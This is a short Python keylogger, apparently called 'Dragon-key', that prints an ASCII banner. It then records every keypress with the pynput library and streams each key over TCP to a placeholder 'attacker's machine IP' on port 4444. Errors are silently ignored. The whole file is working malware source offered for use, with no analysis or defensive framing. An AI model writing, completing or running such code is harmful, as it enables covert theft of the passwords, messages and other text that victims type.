import socket
import threading
from pynput.keyboard import Listener



print('\n')
print(' ____                                     _                ')
print(' |  _ \ _ __ __ _  __ _  ___  _ __       | | _____ _   _   ')
print(' | | | |  __/ _` |/ _` |/ _ \|  _ \ _____| |/ / _ \ | | |  ')
print(' | |_| | | | (_| | (_| | (_) | | | |_____|   <  __/ |_| |  ')
print(' |____/|_|  \__,_|\__, |\___/|_| |_|     |_|\_\___|\__, |  ')
print('                  |___/                            |___/   ')
print('------------------------DRACKYJR---------------------------')
print('\n')          

# Define the server IP and port
SERVER_IP = "<server ip>"  # Change to your attacker's machine IP
SERVER_PORT = 4444

def send_keys_to_server(key):
    try:
        key = str(key).replace("'", "")  # Clean key format
        if key == "Key.space":
            key = " "
        elif key == "Key.enter":
            key = "\n"
        elif key == "Key.backspace":
            key = "[BACKSPACE]"
        elif key == "Key.shift":
            key = "[SHIFT]"
        elif key == "Key.ctrl":
            key = "[CTRL]"
        elif key == "Key.esc":
            key = "[ESC]"

        client_socket.send(key.encode())  # Send the key over TCP
    except:
        pass

# Create a socket connection
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, SERVER_PORT))

# Start the keylogger
with Listener(on_press=send_keys_to_server) as listener:
    listener.join()
